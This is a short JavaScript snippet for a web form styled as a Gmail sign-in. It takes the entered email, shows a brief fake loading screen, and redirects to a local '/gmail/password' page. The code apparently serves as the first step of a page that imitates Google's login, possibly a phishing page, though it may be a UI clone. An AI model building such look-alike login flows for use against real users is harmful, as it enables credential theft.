(function () {
  const form = document.getElementById('gmail-email-form');
  if (!form) return;

  form.addEventListener('submit', function (e) {
    e.preventDefault();
    const email = document.getElementById('gmail-email').value.trim();
    if (!email) return;

    const loading = document.getElementById('gmail-loading');
    const card = document.querySelector('.gmail-form');
    card.style.display = 'none';
    if (loading) loading.style.display = 'flex';

    const url = '/gmail/password?email=' + encodeURIComponent(email);
    setTimeout(() => { window.location.href = url; }, 900);
  });
})();
